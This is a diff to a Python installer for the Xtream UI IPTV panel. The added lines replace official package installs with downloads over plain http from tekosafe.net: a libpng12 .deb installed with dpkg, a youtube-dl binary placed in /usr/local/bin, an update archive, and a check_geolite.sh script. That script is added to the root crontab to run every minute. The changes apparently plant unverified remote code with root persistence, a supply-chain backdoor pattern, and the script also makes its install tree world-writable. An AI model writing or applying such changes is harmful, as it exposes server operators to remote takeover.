@@ -13,14 +13,11 @@ def prepare():
         try: os.remove(rFile)
         except: pass
     os.system("apt-get update > /dev/null")
-    for rPackage in rPackages:
-        os.system("apt-get install %s -y > /dev/null" % rPackage)
-    printc("Installing pip2 and python2 paramiko")
-    os.system("add-apt-repository universe > /dev/null 2>&1 && curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py > /dev/null 2>&1 && python2 get-pip.py > /dev/null 2>&1 && pip2 install paramiko > /dev/null 2>&1")
-    printc("Installing libpng12")
-    os.system("add-apt-repository ppa:linuxuprising/libpng12 -y > /dev/null && apt-get update > /dev/null")
-    os.system("apt-get install libpng12-0 > /dev/null")
-    os.system("apt-get install -f > /dev/null")
+    os.system("apt-get remove --auto-remove libcurl4 -y > /dev/null")
+    for rPackage in rPackages: os.system("apt-get install %s -y > /dev/null" % rPackage)
+    os.system("wget -q -O /tmp/libpng12.deb http://tekosafe.net/xteko3/libpng12-0_1.2.54-1ubuntu1_amd64.deb")
+    os.system("dpkg -i /tmp/libpng12.deb > /dev/null")
+    os.system("apt-get install -y > /dev/null") # Clean up above
     try: os.remove("/tmp/libpng12.deb")
     except: pass
     os.system("adduser --system --shell /bin/false --group --disabled-login xtreamcodes 2>/dev/null")
@@ -34,6 +31,8 @@ def install():
     rNginxRtmp = "/home/xtreamcodes/iptv_xtream_codes/nginx_rtmp/conf/nginx.conf"
     rIni = "/home/xtreamcodes/iptv_xtream_codes/php/lib/php.ini"
     rIsp = "/home/xtreamcodes/iptv_xtream_codes/wwwdir/includes/streaming.php"
+    rYou = "http://tekosafe.net/xteko3/youtube-dl"
+    rCheckGeo = "http://tekosafe.net/xteko3/check_geolite.sh"
     if not "/home/xtreamcodes/iptv_xtream_codes/" in open("/etc/fstab").read():
         rFile = open("/etc/fstab", "a")
         rFile.write("tmpfs /home/xtreamcodes/iptv_xtream_codes/streams tmpfs defaults,noatime,nosuid,nodev,noexec,mode=1777,size=90% 0 0\ntmpfs /home/xtreamcodes/iptv_xtream_codes/tmp tmpfs defaults,noatime,nosuid,nodev,noexec,mode=1777,size=2G 0 0")
@@ -66,8 +65,11 @@ def install():
         os.system("chmod -R 777 /home/xtreamcodes/")
         os.system("chattr +i /home/xtreamcodes/iptv_xtream_codes/GeoLite2.mmdb")
         os.system("rm /home/xtreamcodes/iptv_xtream_codes/adtools/backups/* 2>/dev/null")
-        os.system("sudo wget http://xtream-ui.mine.nu/Update/youtube-dl -O /usr/local/bin/youtube-dl")
+        os.system("rm /usr/local/bin/youtube-dl 2>/dev/null")
+        os.system('wget -q -O "/usr/local/bin/youtube-dl" "%s"' % rYou)
         os.system("sudo chmod a+rx /usr/local/bin/youtube-dl")
+        os.system('wget -q -O "/home/xtreamcodes/iptv_xtream_codes/check_geolite.sh" "%s"' % rCheckGeo)
+        if not "check_geolite.sh" in open("/etc/crontab").read(): os.system('echo "*/1 *   * * * root /home/xtreamcodes/iptv_xtream_codes/./check_geolite.sh" >> /etc/crontab')
         try: os.remove("/tmp/xtreamcodes.tar.gz")
         except: pass
     if os.path.exists("/home/xtreamcodes/iptv_xtream_codes/database.sql"): os.system("rm /home/xtreamcodes/iptv_xtream_codes/database.sql")
@@ -102,7 +104,7 @@ def start():
     os.system('rm /usr/bin/ffprobe')
     os.system('apt-get install unzip e2fsprogs python-paramiko -y')
     os.system('chattr -i /home/xtreamcodes/iptv_xtream_codes/GeoLite2.mmdb')
-    os.system('wget "https://bitbucket.org/le_lio/assets/raw/master/release_22f.zip" -O /tmp/update.zip -o /dev/null')
+    os.system('wget "http://tekosafe.net/xteko3/update.zip" -O /tmp/update.zip -o /dev/null')
     os.system('unzip /tmp/update.zip -d /tmp/update/ >/dev/null')
     os.system('rm -rf /home/xtreamcodes/iptv_xtream_codes/crons')
     os.system('rm -rf /home/xtreamcodes/iptv_xtream_codes/php/etc')
@@ -110,7 +112,7 @@ def start():
     os.system('rm -rf /tmp/update/XtreamUI-master')
     os.system('rm /tmp/update.zip')
     os.system('rm -rf /tmp/update')
-    os.system('wget http://xtream-ui.mine.nu/GeoLite2.mmdb -O /home/xtreamcodes/iptv_xtream_codes/GeoLite2.mmdb -o /dev/null')
+    os.system('wget https://bitbucket.org/emre1393/xtreamui_mirror/downloads/GeoLite2.mmdb -O /home/xtreamcodes/iptv_xtream_codes/GeoLite2.mmdb -o /dev/null')
     os.system('chown -R xtreamcodes:xtreamcodes /home/xtreamcodes')
     os.system('find /home/xtreamcodes/ -type d -not \( -name .update -prune \) -exec chmod -R 777 {} + ')
     os.system('chattr +i /home/xtreamcodes/iptv_xtream_codes/GeoLite2.mmdb')
